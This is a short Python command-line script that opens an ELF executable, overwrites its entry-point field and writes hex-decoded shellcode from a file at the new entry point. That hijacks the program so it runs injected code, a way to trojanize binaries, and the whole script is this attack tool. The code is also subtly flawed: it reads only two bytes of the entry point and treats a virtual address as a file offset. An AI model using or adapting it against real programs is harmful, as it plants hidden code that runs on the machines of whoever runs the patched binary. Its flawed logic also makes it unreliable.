#!/usr/bin/env python3

if __name__ != "__main__":
    exit("Aborted")

import sys
import os
from binascii import unhexlify
import dis

def read_entry_point():
    current_offset = elf.tell()
    elf.seek(ELF_ENTRY_OFFSET)
    ep = elf.read(2)
    elf.seek(current_offset)
    return bytes.fromhex(ep[::-1].hex())

# check required args
if len(sys.argv) < 4:
    print(f"[-] Missing args\n\
[*] usage: {sys.argv[0]} target_elf new_entry_point shellcode_file")
    exit()

ELF_ENTRY_OFFSET = 0x18
TARGET_FILE      = sys.argv[1]
EP_NEW           = sys.argv[2]
SHELLCODE_FILE   = sys.argv[3]

try:
    elf = open(TARGET_FILE, 'r+b')
except IOError:
    print(f"[-] No such file '{TARGET_FILE}'")
    exit("Aborted")

elf.seek(1)
if elf.read(3) == b"ELF":
    print(f"[+] ELF binary '{TARGET_FILE}'")
else:
    print(f"[-] '{TARGET_FILE}' is not an ELF binary")
    exit("Aborted")

if SHELLCODE_FILE != "NULL":
    try:
        scf = open(SHELLCODE_FILE, "r+b")
        print(f"[+] Shellcode file: '{SHELLCODE_FILE}")
    except IOError:
        print(f"[-] No such file '{SHELLCODE_FILE}'")
        exit("Aborted")

# seek to entry point offset
elf.seek(ELF_ENTRY_OFFSET)
ep_original = read_entry_point()
print(f"[*] Original entry point: 0x{ep_original.hex()}")

if EP_NEW != "NULL":
    try:
        EP_NEW = bytes.fromhex(EP_NEW)
    except ValueError:
        print(f"[-] Invalid entry point '{EP_NEW}'")
        exit("Aborted")

    print(f"[+] New entry point: 0x{EP_NEW.hex()}")
else:
    EP_NEW = ep_original

# rewrite EP
elf.write(EP_NEW[::-1])


if 'scf' in locals():
    # seek to new entrypoint
    elf.seek(int(EP_NEW.hex(), 16))
    scsz = int(os.path.getsize(SHELLCODE_FILE) / 2)
    print(f"\
[+] Shellcode size: {scsz} bytes\n\
[*] Writing shellcode..")
    
    for i in range(scsz):
        byte = scf.read(2)
        elf.write(unhexlify(byte))
        i += 2

    scf.close()

elf.close()

print("[+] Done")
